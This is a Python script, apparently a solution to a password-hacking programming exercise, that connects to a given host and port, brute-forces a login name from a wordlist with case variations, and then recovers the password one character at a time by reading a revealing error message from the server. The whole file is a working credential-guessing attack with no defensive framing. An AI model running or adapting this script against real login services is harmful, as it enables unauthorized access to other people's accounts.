import socket
import sys
from itertools import product
import json
import string

def main():
    if len(sys.argv) < 3:
        print("Error! Correct usage: 'script name' 'localhost' 'port' 'message you want to send' ")
        sys.exit()

    host = sys.argv[1]
    port = int(sys.argv[2])

    client_socket = socket.socket()
    client_socket.connect((host, port))

    login = find_login(client_socket)
    find_password(client_socket, login)

def find_login(client_socket):
    with open('login') as f:
        logins = f.read().splitlines()

    for word in logins:
        char_pairs = [(c.lower(), c.upper()) if c.isalpha() else (c,) for c in word]
        for p in product(*char_pairs):
            guess = "".join(p)
            is_valid_login = json.dumps({"login": guess, "password": 'a'})
            client_socket.send(is_valid_login.encode())
            response = client_socket.recv(1024)
            response = response.decode()
            response = json.loads(response)
            if response['result'] != "Wrong login!":
                return guess

    return None

def find_password(client_socket, login):
    all_chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
    password = ""

    while True:
        for c in all_chars:
            json_dict = json.dumps({"login": login, "password": password + c})
            client_socket.send(json_dict.encode())
            response = client_socket.recv(1024)
            response = response.decode()
            response = json.loads(response)
            if response['result'] == "Exception happened during login":
                password += c
                break
            elif response['result'] == "Connection success!":
                password += c
                print(json_dict)
                client_socket.close()
                return


if __name__ == "__main__":
    main()
